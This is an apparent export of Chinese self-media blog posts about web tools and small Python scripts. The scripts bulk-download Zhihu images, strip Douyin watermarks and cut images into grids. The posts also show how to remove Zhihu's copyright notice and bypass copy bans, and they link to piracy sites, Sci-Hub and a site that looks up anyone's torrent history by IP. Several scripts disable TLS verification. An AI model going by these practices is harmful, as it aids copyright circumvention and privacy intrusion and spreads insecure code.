b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（五）]]></title>
    <url>%2F2020%2F09%2F18%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第173篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有趣的网站 ，那些有趣的网站（二），那些有趣的网站系列（三），那些有趣的网站系列（四），这是系列第5篇。 查看下载历史输入ip地址能查到它的 p2p 下载历史 ，查了下某个地址，简直辣眼睛，不得不打码 https://iknowwhatyoudownload.com/en/peer/ 英超地图可视化展示了从 1992-2020 每个赛季的英超球队主场分布http://ggdg.gitee.io/map_of_the_premier_league/ 多图合成 GIF 将多张图片合成为GIF，还可以调节速度，设置背景，尺寸，添加文字特效 https://tt0.top/img2gif/http://www.yingjingtu.com/createGIF合成效果GIF图。一个在线 GIF 编辑https://gifsuper.com/ http://www.gifntext.com/ 生成条形竞赛图动画只需要上传csv数据文件（分号隔开）就能生成目前流行的条形竞赛图动画 https://fabdevgit.github.io/barchartrace/ https://www.appinn.com/bar-chart-race-generator/ 生成的GIF效果图。 你对ios系统有多了解来测试下你对ios系统有多了解 https://sspai.com/page/wwdc20_ios/exam比如初代iPhone默认的锁屏壁纸是左边还是右边的？ 北京话大辞典可以输入汉字或者拼音查询北京话的具体含义，比如 倍儿 是特别的意思。https://www.beijinghuadacidian.com/ 证件照换底色智能证件照生成，证件照换底色，可以设置白色，红色，蓝色，透明 https://www.mfpng.com/ 期刊杂志搜索学生时代都看过 读者文摘，意林，知音类似的杂志吧，这个网站可以在线搜索查看 http://new-qk.lifves.com/index.php比如最新2020第17期读者，可以在线浏览，右侧还有只会动的小猫咪。 scihub 最新网址Sci.hub是一个开源学术数据库，上面免费提供了超过62,000,000篇科学论文和文章， https://sci-hub.now.sh/ 这个网站可以获取最新可用网址 ，https://whereisscihub.now.sh/比如可用的 https://sci-hub.se/ 查找同类网站查找同类网站，比如b站 https://www.similarsites.com/site/bilibili.com 的同类a站，油管，可以给找电影/竞争对手提供一个思路。 随机博客随机跳转到某一博客，也许能发现一个有意思的博客 https://neyu.com/blog.html ，这个随机有点类似 今天中午吃什么 https://www.zwcsm.com/ ，随机一只狗https://shibe.online/ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何用Python批量下载知乎回答图片]]></title>
    <url>%2F2020%2F09%2F18%2F%E5%A6%82%E4%BD%95%E7%94%A8Python%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E7%9F%A5%E4%B9%8E%E5%9B%9E%E7%AD%94%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[苏生不惑第172 篇原创文章，将本公众号设为星标，第一时间看最新文章。 这两天刷知乎看到腾讯的一个回答 有什么可爱的微信头像 ？https://www.zhihu.com/question/310335618/answer/602970433，分享了上百张QQ高清经典头像。 于是想着一次性下载下来（公众号后台回复 知乎 获取下载的QQ头像），下面分享几个批量下载图片工具。https://www.lanzoux.com/iKPVcgfdpji FatkunFatkun是一款内嵌到浏览器的工具；可以帮你方便地从任意网站上批量采集喜欢的图片并迅速完成筛选和保存 http://web.fatkun.cn/extension.html ，支持Chrome、360、QQ、2345、百度、UC、猎豹等所有chrome内核浏览器及Firefox浏览器。 这里下载的是Chrome扩展，安装Chrome扩展方法见之前文章 上不了谷歌如何安装 Chrome 扩展 先拉到网页底部，右键选择批量下载。看到有238张图。 全选图片，点下载。很快图片就下载好了，下载目录打开 chrome://downloads/ 可以看到。 也可以导出所有图片链接 ，格式改为 {LINK} 就是纯链接了，然后用idm这种软件批量下载。 类似的Chrome扩展还有 图片助手 https://chrome.google.com/webstore/detail/imageassistant-batch-imag/dbjbempljhcmhlfpfacalomonjpalpko?hl=zh-CN ，右键提取图片。 可以根据图片类型，打消过滤选择下载的图片。 imagecyborghttps://imagecyborg.com/ 这是个在线网站，输入知乎回答链接即可下载图片。下载的图片在一个zip压缩包内，不过国外的网站有点慢。 Python脚本下载知乎有接口可以获取回答内容，所以使用Python下载就很简单了。 单个回答接口 https://www.zhihu.com/api/v4/answers/602970433?include=is_normal,is_sticky,collapsed_by,suggest_edit,comment_count,collapsed_counts,reviewing_comments_count,can_comment,content,editable_content,voteup_count,reshipment_settings,comment_permission,mark_infos,created_time,updated_time,relationship.is_author,voting,is_thanked,is_nothelp,upvoted_followees;author.is_blocking,is_blocked,is_followed,voteup_count,message_thread_token,badge[?(type=best_answerer)].topics 可以看到content就是回答内容，图片地址也都在里面。 简单的代码如下：1234567891011121314151617181920212223242526272829import urllibimport requestsfrom pyquery import PyQuery as pqimport osfrom hashlib import md5from multiprocessing.pool import Pool#python爬取知乎回答图片 https://zhuanlan.zhihu.com/p/43408400 https://www.zhihu.com/question/310335618/answer/602970433url = 'https://www.zhihu.com/api/v4/answers/602970433?include=is_normal,is_sticky,collapsed_by,suggest_edit,comment_count,collapsed_counts,reviewing_comments_count,can_comment,content,editable_content,voteup_count,reshipment_settings,comment_permission,mark_infos,created_time,updated_time,relationship.is_author,voting,is_thanked,is_nothelp,upvoted_followees;author.is_blocking,is_blocked,is_followed,voteup_count,message_thread_token,badge[?(type=best_answerer)].topics'headers = &#123; 'Accept': "application/json, text/javascript, */*; q=0.01", 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36", 'Referer': 'https://www.zhihu.com/api/v4/questions/602970433', 'x-requested-with': 'fetch', &#125;res = requests.get(url,headers=headers,verify=False).json()print(res['content'])content = pq(res['content']) # content 内容为 xml 格式的网页，用pyquery解析imgs_url = []imgs = content('figure noscript img').items()i = 0for img_url in imgs: i+=1 imgs_url.append(img_url.attr('src')) tmp = requests.get(img_url.attr('src'),headers=headers,verify=False) with open('pics/'+str(i)+'.jpg', 'wb') as f: f.write(tmp.content)#pip install wget#filename = wget.download(url)print('图片总数:'+str(len(imgs_url))) 执行脚本 Python zhihu.py ,很快就下载完了。 如果想下载所有回答的图片可以使用接口 https://www.zhihu.com/api/v4/questions/310335618/answers?include=data%5B%2A%5D.is_normal%2Cadmin_closed_comment%2Creward_info%2Cis_collapsed%2Cannotation_action%2Cannotation_detail%2Ccollapse_reason%2Cis_sticky%2Ccollapsed_by%2Csuggest_edit%2Ccomment_count%2Ccan_comment%2Ccontent%2Ceditable_content%2Cvoteup_count%2Creshipment_settings%2Ccomment_permission%2Ccreated_time%2Cupdated_time%2Creview_info%2Crelevant_info%2Cquestion%2Cexcerpt%2Crelationship.is_authorized%2Cis_author%2Cvoting%2Cis_thanked%2Cis_nothelp%2Cis_labeled%2Cis_recognized%2Cpaid_info%3Bdata%5B%2A%5D.mark_infos%5B%2A%5D.url%3Bdata%5B%2A%5D.author.follower_count%2Cbadge%5B%2A%5D.topics&amp;limit=5&amp;offset=0&amp;platform=desktop&amp;sort_by=default 最后说几个知乎的使用技巧。 知乎复制的时候总会增加版权信息，比如 ： 作者：xxx链接：https://www.zhihu.com/question/310335618/answer/602970433来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 如果想去掉，打开控制台执行__z_z__.vu = () =&gt; ({Id: ()=&gt;&#39;&#39;}) ，再次复制就没有了，当然这样有点麻烦，可以自己写个油猴脚本来自动执行，可以参考我之前写的 如何更优雅地看电影/刷剧 有些回答禁止了复制功能，会提示禁止转载，安装simple allow copy 这个扩展 https://chrome.google.com/webstore/detail/simple-allow-copy/aefehdhdciieocakfobpaaolhipkcpgc 一键搞定，之前文章也介绍过 如何搞定某些网站不让复制文字 知乎小管家头像地址 https://pic4.zhimg.com/v2-85b5868ae1ee114c5818d29201aef708_xl.jpg地址改为https://pic4.zhimg.com/v2-85b5868ae1ee114c5818d29201aef708_l.jpg 就是一张100*100的缩略图。 改为 https://pic4.zhimg.com/v2-85b5868ae1ee114c5818d29201aef708_r.jpg 就是原始大图，这个跟微博有点类似，之前也介绍过 如何更优雅地使用微博 更多知乎技巧见之前文章 那些你可能不知道的知乎奇技淫巧 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[神器！人工智能分离歌曲中的人声和背景音乐]]></title>
    <url>%2F2020%2F09%2F18%2F%E7%A5%9E%E5%99%A8%EF%BC%81%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%88%86%E7%A6%BB%E6%AD%8C%E6%9B%B2%E4%B8%AD%E7%9A%84%E4%BA%BA%E5%A3%B0%E5%92%8C%E8%83%8C%E6%99%AF%E9%9F%B3%E4%B9%90%2F</url>
    <content type="text"><![CDATA[苏生不惑第171 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过将视频转GIF如何将视频轻松转换为 GIF 和文字转语音 如何轻松的将文字转语音 ，今天分享几个神器，可以分离音频中的人声和背景音乐。 先准备一首周杰伦的音频《晴天》。 ezstemshttps://ezstems.com/ 这个网站支持上传YouTube链接或者自己上传文件。不过免费用户文件限制10MB大小，否则提示不可用。1Sorry, file size must be less than 10mb. You can increase the upload limit by logging into your dashboard and upgrading your membership. 上传音频文件《晴天》后等待一会。一会就处理完了，直接下载到本地。下载有2个文件：人声 accompaniment.mp3 和背景音乐 vocals.mp3 ，可以在微信点击听下效果，还是不错的。 神器！人工智能分离歌曲中的人声和背景音乐 lalalhttps://www.lalal.ai/ 在线上传歌曲就可以免费将语音和背景音乐分离。 分离后直接下载。 moiseshttps://moises.ai/ 使用人工智能分离音乐音轨，上传歌曲，然后提取出伴奏音轨和人声音轨用谷歌账号登录后上传音频文件。完成后下载人声和伴奏音频文件。 vocalremoverhttps://vocalremover.org/ch/ 借助强大的AI算法将歌曲中的声音与音乐分离开来 。 上传音频文件，这个不限制10MB 。处理时间大概20秒左右。直接下载到本地，效果也不错。 如果卡住了没出现下载界面，直接用idm下载。 这个网站还可以在线修剪歌曲或删除其中的片段。 之前也分享过类似的 那些你可能用得上的在线办公神器系列（三） https://mp3cut.net/cn/ ， https://online-audio-converter.com/ ，https://ezgif.com/cut-video，https://ringer.org/zh/ ，https://clideo.com/editor/cut-audio 上面几个都是国外的网站，下面分享个国内的 团子。 团子团子是基于 Python 开源项目 Spleeter https://github.com/deezer/spleeter 做的，利用 ai技术从任何音频中分离出伴奏，人声，鼓点，贝斯以及其他乐器https://dango.ai/ 上传音频等待一会。可以试听30秒。下载也只能下30秒。虽然效果不错，不过下载全部音频得花钱（一首6块钱），还不如使用国内另外一个产品分轨https://ifengui.com/ ，它每个月有10分钟免费额度。 测试下来推荐使用 vocalremover，不过国外网站会比较慢，如果你不介意付费可以使用团子，分轨。 最后分享个音效配乐素材网站 http://www.aigei.com/ ，做视频可能用得上。 还有命令行神器 ffmpeg ，比如 提取视频中的音频ffmpeg -y -i input.mp4 -vn -codec copy out.m4a ，批量提取for %i in (*.mp4) do ffmpeg -i %i -vn -codec copy %i-out.m4a 还有对应的moviepy 库 pip install moviepy123import moviepy.editor as mpclip = mp.AudioFileClip('lzq.mp4')clip.write_audiofile('lzq2.mp3') 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何发一条九宫格图片的朋友圈]]></title>
    <url>%2F2020%2F09%2F18%2F%E5%A6%82%E4%BD%95%E5%8F%91%E4%B8%80%E6%9D%A1%E4%B9%9D%E5%AE%AB%E6%A0%BC%E5%9B%BE%E7%89%87%E7%9A%84%E6%9C%8B%E5%8F%8B%E5%9C%88%2F</url>
    <content type="text"><![CDATA[苏生不惑第170 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过以下文章，有兴趣可以点击查看： 如何导出你的微信语音 c 盘空间又满了？微信清理神器帮你释放空间 微信撤回的消息也能看到！ 如何备份可能被删的公众号文章和网页 如何在电脑上登陆多个微信 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 一键生成你的微信社交数据报告 你可能在朋友圈看过九宫格图片（把一张图片按照比例分成九份），就像这样的：还有微博九宫格图 https://weibo.com/2717930601/JjpKtlUZ9 ： 这种九宫格图片怎么发的呢？下面用Python搞定它，Python是门很简单实用的语言，即使不做开发工作也可以学习下，比如之前的下载抖音 一键批量下载抖音无水印视频 ，下载公众号文章一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 都是用的Python，之后我会写一篇如何使用Python来抓取数据，代码非常简单，只要你认识英文字母就会用。 PIL处理图片先用pip安装切割图片的库 PIL pip install Pillow ， 然后编辑代码： 12345678910111213141516from PIL import Image,ImageSequence,ImageFilterpic = input("请输入图片文件名：")im = Image.open(pic)width = im.size[0]//3height = im.size[1]//3x = 0y = 0filename = 1#保存的文件名for i in range(3): for j in range(3): crop = im.crop((x, y, x+width, y+height)) crop.save(str(filename) + '.jpg') x += width filename += 1 x = 0 y += height 直接命令行执行 python pic.py ，输入图片文件名即可在本地生成9张小图。 还可以将代码打包为exe可执行文件，这样不用安装Python就可以运行了。 pyinstaller 打包exe打包用的工具是pyinstaller，先pip install pyinstaller安装它，然后pyinstaller -F pic.py，不过我运行的时候出错了。 123 for real_module_name, six_module_name in real_to_six_module_name.items():AttributeError: 'str' object has no attribute 'items' 谷歌了下需要升级库。1234567891011121314151617181920λ pip install -U setuptoolsCollecting setuptools Downloading https://files.pythonhosted.org/packages/6d/ed/52e05469314a266f68d9f251a8c1ab7a21a03327b1724056e3eea654bfd1/setuptools-50.0.3-py3-none-any.whl (784kB)Installing collected packages: setuptools Found existing installation: setuptools 41.2.0 Uninstalling setuptools-41.2.0: Successfully uninstalled setuptools-41.2.0Successfully installed setuptools-50.0.3pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple# 更新pip版本python -m pip install -U pipλ pip uninstall enum34Uninstalling enum34-1.1.6: Would remove: d:\python\lib\site-packages\enum34-1.1.6.dist-info\* d:\python\lib\site-packages\enum\*Proceed (y/n)? y Successfully uninstalled enum34-1.1.6""" 再次执行pyinstaller -F pic.py 终于成功了，不过生成的exe文件有点大（20多MB，公众号后台回复 朋友圈 获取exe文件），双击exe文件输入文件名就可以运行了。 https://www.lanzoux.com/iWtJNgcrmxa 123456760106 INFO: Building PKG (CArchive) PKG-00.pkg completed successfully.60112 INFO: Bootloader d:\python\lib\site-packages\PyInstaller\bootloader\Windows-32bit\run.exe60114 INFO: checking EXE60115 INFO: Building EXE because EXE-00.toc is non existent60115 INFO: Building EXE from EXE-00.toc60115 INFO: Appending archive to EXE d:\download\dist\pic.exe60279 INFO: Building EXE from EXE-00.toc completed successfully. PIL除了切割图片还可以对照片去色。123img = Image.open("jay.jpg")img2 = img.convert("L")img2.save("jay2.jpg") 去色效果图：对照片模糊处理。12img2 = img.filter(ImageFilter.GaussianBlur(radius=10)) img2.save("jay_blur.jpg") 模糊效果图： 对照片旋转90度。12img3 = img.rotate(90)img3.save("jay_rotate.jpg") 旋转效果图： 对照片翻转。12img4 = img.transpose(Image.FLIP_LEFT_RIGHT)img4.save("jay_transpose.jpg") 翻转效果图，周杰伦七里香几个字翻过来了： 照片缩略图。1234size = (120, 120)img5 = img.copy()img5.thumbnail(size)img5.save("jay_thumbnail.jpg") 除了使用Python 也有在线工具和微信小程序可以生成九宫格图片 https://www.dute.org/image-clip ，上传图片下载即可。 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python一键批量下载抖音无水印视频]]></title>
    <url>%2F2020%2F09%2F04%2FPython%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E6%8A%96%E9%9F%B3%E6%97%A0%E6%B0%B4%E5%8D%B0%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第169 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于下载视频之前写过 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ ， 那些你可能不知道的视频下载奇技淫巧 抖音视频也可以直接通过idm来下载，先在抖音复制视频链接。 用谷歌浏览器打开视频链接后点击视频右上角的idm（公众号后台回复 idm获取软件 ）就能下载了 。 不过这样下载的视频带有抖音的标志，如果想去除这个水印，下面分享个简单的方法。 打开浏览器控制台使用手机模式访问会跳转到 https://www.iesdouyin.com/share/video/6867075534275366148/ 可以看到请求接口 https://www.iesdouyin.com/web/api/v2/aweme/iteminfo/?item_ids=6867075534275366148 ，返回值play_addr里就有播放地址url_list https://aweme.snssdk.com/aweme/v1/playwm/?video_id=v0300fff0000bt6c070r0ed42bvp5uo0&amp;ratio=720p&amp;line=0这个地址是有水印的，将地址里的playwm改为play就是无水印播放地址了。 下载后播放对比下，左侧的抖音水印没了。无水印视频还少了3秒 ，因为视频结尾的一小段 来抖音，发现更多创作者 也没了。 当然这样下载无水印视频有点麻烦，一般小白还不会，Python 可以帮你一键下载。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import refrom urllib.parse import urlparseimport requestsheaders = &#123; 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'zh-CN,zh;q=0.9', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Mobile Safari/537.36' &#125;domains = ['www.douyin.com', 'v.douyin.com', 'www.snssdk.com', 'www.amemv.com', 'www.iesdouyin.com', 'aweme.snssdk.com']url = input("请输入你要去水印的抖音短视频链接：")#url =' https://v.douyin.com/oXbjfe/'response = requests.get(url,headers=headers,allow_redirects=False)true_url =response.headers['location']#print(true_url)parse_url = urlparse(true_url)if parse_url.netloc not in domains: raise Exception("无效的链接")vid = re.findall(r'\/share\/video\/(\d*)', parse_url.path)[0]#print(vid)response = requests.get('https://www.iesdouyin.com/web/api/v2/aweme/iteminfo/?item_ids='+str(vid))result = response.json()#print(result)item = result.get("item_list")[0]author = item.get("author").get("nickname")mp4 = item.get("video").get("play_addr").get("url_list")[0]cover = item.get("video").get("cover").get("url_list")[0]mp4 = mp4.replace("playwm", "play")res = requests.get(mp4, headers=headers, allow_redirects=True)mp4url = res.url#http://v5-dy-d.ixigua.com/aa21024d9f51deaa2e8ce9ba4f6447f5/5f4cb46c/video/n/tosedge-tos-agsy-ve-0015/ed75a5dbbddf483a8c1382162d31d52f/?a=1128&amp;br=2016&amp;bt=672&amp;cr=0&amp;cs=0&amp;cv=1&amp;dr=0&amp;ds=3&amp;er=&amp;l=202008311526410101980621631104B96C&amp;lr=&amp;mime_type=video_mp4&amp;qs=0&amp;rc=ajM7azNqOXk4dTMzOmkzM0ApOzY6NjZoZWQ6N2UzNjlmNmdpYi0zbnEvMi5fLS1iLS9zczUzLi40NmBhXjEyLzAzYWA6Yw%3D%3D&amp;vl=&amp;vr=#print(mp4url)desc = item.get("desc")mp3 = item.get("music").get("play_url").get("url_list")[0]#name = input("===&gt;正在下载保存视频,请输入视频名称：")video = requests.get(url=mp4url, headers=headers)audio = requests.get(url=mp3, headers=headers)data = dict()data['mp3'] = mp3data['mp4'] = mp4urldata['cover'] = coverdata['nickname'] = authordata['desc'] = descdata['duration'] = item.get("duration")#print(data)with open(desc+".mp4", 'wb') as f, open(desc+".mp3", 'wb') as f2: f.write(video.content) f.close() f2.write(audio.content) f2.close() print("===&gt;音频和视频下载完成") 直接执行脚本 python douyin.py ，很快下载好了。 视频对应的mp3音频http://p9-dy.byteimg.com/obj/ies-music/6867075567041121031.mp3也下载了。 除了Python已经有很多不错的软件可以很方便的下载无水印抖音视频了，下面分享几个好用的。 这个软件（公众号后台回复 抖音获取软件）https://www.lanzoux.com/iTKnwgbujgh支持抖音，皮皮虾，快手，火山，微视等平台视频的批量下载，还支持采集视频。 输入抖音视频链接地址 https://v.douyin.com/JkaChFt/ ，点击解析可以看到视频标题和下载链接。还可以输入抖音作者主页地址 https://v.douyin.com/JkaaoTH/ ，解析可以获取作者视频列表。然后右键下载，很快下载完了。播放看看，左上方的抖音水印没了。 另外一个软件 抖音信息解读 https://www.lanzoux.com/iUj4ng8st0b ，可以搜索列出作者600多个视频（包含作者头像，视频标题，视频地址，点赞数，评论数，分享数，音乐地址，无水印链接等），在右侧可以选择视频下载。 分享个网站 抖音排行榜 https://www.jxpie.com/# https://kolranking.com/ 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何根据台词找到对应电影片段]]></title>
    <url>%2F2020%2F09%2F04%2F%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%8F%B0%E8%AF%8D%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%94%B5%E5%BD%B1%E7%89%87%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[苏生不惑第168 篇原创文章，将本公众号设为星标，第一时间看最新文章。 有时候看到一句熟悉的台词，却不知出自哪部电影，或者想给喜欢的台词配个图，又懒得重看整部电影截图，如果能根据台词搜到电影，还能找到对应的时间点就好了，正好下面分享的几个网站能满足你。 subzin直接在 http://www.subzin.com/ 输入台词, 它会告诉你在哪部电影/电视剧中出现过，还会给出台词出现的时间和上下文，你甚至可以用来学单词和俚语的具体情景用法，让自己的英语表达更地道。 比如奥斯卡电影《阿甘正传》里的经典台词： Life was like a box of chocolate ，意思是人生就像一盒巧克力，你永远不知道会尝到哪种滋味。 搜索下，第一个就是电影 《阿甘正传》。点击后可以看到台词在电影3分38秒出现，上一句台词是My mama always said 。如果没找到还有类似的网站 http://www.quodb.com/ ，https://www.whatismymovie.com/ ， https://getyarn.io/ （这个搜索到的视频片段还能直接下载）。 另外推荐 https://www.tunefind.com/ ，这是个音乐搜索网站，可帮你查找影视剧中的音乐，不光会列出每一集里都有哪些音乐，还会告诉你每首歌出现在哪个场景。 找台词subzin虽然很强大，无奈不支持中文，http://zhaotaici.cn/ 和 http://findmovie.wang/ ，http://33.agilestudio.cn/ 可以支持中文搜索。点开上下文可以看到前后台词和出现的时间点。 之前很火的那句“老许，你要老婆不要”也能搜到，是来自1982年谢晋电影三部曲之《牧马人》 https://www.bilibili.com/video/av82588687 这句台词出现在电影43分钟。 字幕库如果你想下载整部电影的台词推荐字幕库 ，在网站http://www.zimuku.la/ 搜索 阿甘正传 可以找到整部电影字幕，类似的网站还有 https://secure.assrt.net/ 。 英文电影可以在台词社看完整文字版 https://www.taicishe.com/movie-forrest-gump-1994 台词拼接如果你想拼接电影台词推荐 http://join-screenshots.zhanghai.me/ 或者https://www.yoo.la/#/ ，http://screenshots.hpday.cn/ ，高清电影截图可以在https://film-grab.com/ 找，这个网站每张电影截图都是人工采集下来的。 上传2张电影台词截图。 拼接效果： 经常有小伙伴在后台问电影，分享2个比较全的电影网站：电影狗http://www.dianyinggou.com/ 和片库 https://www.pianku.tv/，如果想找百度网盘里的电影，推荐之前文章 2020 最全百度网盘搜索，找电影资源不再愁 ，搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 ，如何更优雅地看电影/刷剧 ，只要方法用对，应该没有找不到的电影/电视剧。 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[发福利了，小伙伴们来领现金红包]]></title>
    <url>%2F2020%2F09%2F04%2F%E5%8F%91%E7%A6%8F%E5%88%A9%E4%BA%86%EF%BC%8C%E5%B0%8F%E4%BC%99%E4%BC%B4%E4%BB%AC%E6%9D%A5%E9%A2%86%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[一晃2020年8个月都快过完了，持续在公众号每周更新原创文章也一年多了，现在已经有167篇了（我都佩服自己坚持这么久），我将我的文章都下载好了，需要的小伙伴可以在后台回复 公众号获取，详情见之前文章 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 公众号每周更新2-3篇原创文章，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能对你有所帮助。 下面说重点，对这个月精选留言（就是能在文章末尾出现的留言）最多的10个小伙伴（微信后台统计）发福利，每人18.8元现金红包（别嫌少哈，之后会增加的），加我微信领取。 另外在本文文末留言评论，说说你对苏生不惑的建议或者意见，点赞前10每人8.8元红包，截止时间8月30号20点，还有在公众号后台回复支付宝领取支付宝红包，先到先得哈。 另外再发个抽奖，在公众号后台回复 抽奖进入小程序抽奖，中奖后可直接提现到微信钱包。 之后每个月月末都会这样发福利，如果公众号收益增加了，福利也会越来越大，所以我偶尔发的广告也请大家点击支文章持下。 大家在后台的留言我都会回复的（可能不及时，因为白天要上班）。 如果没有收录你发的关键词还可以打开公众号右上角的搜索按钮。输入 去logo 就能找到这篇文章如何更优雅地看电影/刷剧 ，里面有详细说明如何去除腾讯优酷和爱奇艺视频上方的logo。 另外每篇文章开头也有个搜索。点击以后也会进入搜索界面，它会列出我设置的4个搜索词，可以直接点击列出的词搜索，或者自己输入关键词后搜索。 当然最好是在文章下留言，这个提醒会强点，我会及时回复。 如果有需要可以加我微信交流。 再推荐下之前整理的文章列表： 2019 年公众号 苏生不惑 近百篇原创文章整理 关于公众号搜索和专辑 关于 苏生不惑 公众号 精选文章 在公众号菜单里的历史文章也可以浏览我发过的所有文章。 